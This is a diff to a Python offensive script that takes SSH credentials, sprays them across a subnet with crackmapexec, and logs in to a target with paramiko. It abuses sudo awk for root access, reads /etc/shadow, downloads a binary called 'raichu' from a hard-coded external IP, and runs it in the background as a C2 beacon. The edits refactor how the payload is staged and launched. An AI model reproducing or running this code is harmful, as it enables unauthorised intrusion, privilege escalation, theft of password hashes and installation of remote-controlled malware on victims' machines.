@@ -25,7 +25,7 @@ def execute_ssh_commands(username, password, host, commands):
 
         for command in commands:
             # Execute each command with the password
-            full_command = f"{command}"
+            full_command = f"nohup {command} > /dev/null 2>&1 &"
             stdin, stdout, stderr = client.exec_command(full_command)
 
             # Print the output
@@ -102,14 +102,38 @@ def phaseTwo():
 	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
 	#subprocess.run(cme, shell=True, text=True)
 	# Initial SSH Connection, enumerate, and then perform privesc
-	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://94.249.192.5:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow && /root/raichu 2>&1 &\")}'"
-	commands_to_run = [
+	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://94.249.192.5:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow\")}'"
+	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/raichu &\")}'"
+	commands = [
 	"whoami",
 	f"echo {password} | sudo -S -l",
 	"pwd",
-	f"echo {password} | {awkC2}",
+	f"echo {password} | {awkStage}"
 	]
-	execute_ssh_commands(username, password, target_ip, commands_to_run)
+	client = paramiko.SSHClient()
+
+	try:
+		# Automatically add the server's host key
+		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+		# Connect to the SSH server
+		client.connect(target_ip, username=username, password=password)
+
+		for command in commands:
+			# Execute each command with the password
+			full_command = f"{command}"
+			stdin, stdout, stderr = client.exec_command(full_command)
+
+			# Print the output
+			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
+		# Finish command loop and then run C2 Beacon in the background
+		full_command = f"echo {password} | {awkC2}"
+		stdin, stdout, stderr = client.exec_command(full_command + '&', timeout=5)
+		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
+		# Close the SSH connection
+		client.close()
+	except Exception as e:
+		pass
 	print("finished phase two tasks.")
 	
 	
